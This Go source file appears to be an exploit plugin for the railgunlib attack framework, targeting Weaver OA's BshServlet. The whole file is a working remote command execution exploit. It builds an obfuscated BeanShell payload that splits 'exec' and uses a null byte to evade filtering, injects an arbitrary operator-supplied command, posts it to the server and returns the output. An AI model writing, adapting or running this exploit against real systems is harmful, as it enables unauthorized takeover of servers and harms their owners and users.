package exp_weaver

import (
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	url2 "net/url"

	"strings"
)

type Exp_OA_RCE struct {
	exp_templates.ExpTemplate
}

func (self *Exp_OA_RCE) Attack_cmd1() (expResult exp_model.ExpResult) {
	cmd := self.MustGetStringParam("cmd")
	// 构造payload
	headers := self.GetInitExpHeaders()

	cmd = strings.ReplaceAll(cmd, `"`, `\"`)
	cmd = url2.PathEscape(cmd)
	uri := "bsh.servlet.BshServlet"
	url := self.Params.BaseParam.Target
	if !strings.Contains(strings.ToLower(url), strings.ToLower(uri)) {
		url = strings.TrimRight(url, "/") + "/weaver/" + uri
	}
	headers["Content-Type"] = []string{"application/x-www-form-urlencoded"}
	data := `bsh.script=eval%00("ex"%2b"ec(\"lz520520\")");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw`
	data = strings.Replace(data, "lz520520", cmd, 1)

	// 发送请求
	httpresp := self.HttpPostWithoutRedirect(url, data, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.Result = httpresp.Body
	return
}

// func
func init() {
	exp_register.ExpStructRegister(&Exp_OA_RCE{}, "exp_OA_BshServlet.yml")
}
